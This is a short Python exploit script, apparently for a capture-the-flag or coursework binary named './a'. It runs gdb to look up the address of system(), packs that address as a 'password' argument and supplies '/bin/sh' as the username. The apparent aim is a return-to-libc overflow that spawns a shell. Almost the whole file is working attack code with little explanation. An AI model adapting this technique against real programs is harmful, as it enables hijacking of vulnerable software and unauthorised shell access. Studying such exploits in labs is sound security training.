import os
import re
import struct
import subprocess


# gdb <program> --batch -ex <command> -ex <command> ... loads <program> into gdb and runs all the <commands> on it.
output = subprocess.check_output(['gdb', './a', '--batch',
    '-ex', 'break 33',
    '-ex', 'run foo',
    '-ex', 'print system',
])

# The "print system" command prints $1 = {...} 0x... <...>
system_address = int(re.search(r'\$1 =.*?0x([0-9a-f]*)', output).group(1), 16)

print('password address is 0x%08x' % system_address)

username = '/bin/sh'
password = struct.pack('<I', system_address)

# Let's go!
os.execl('./a', './a', username, password)
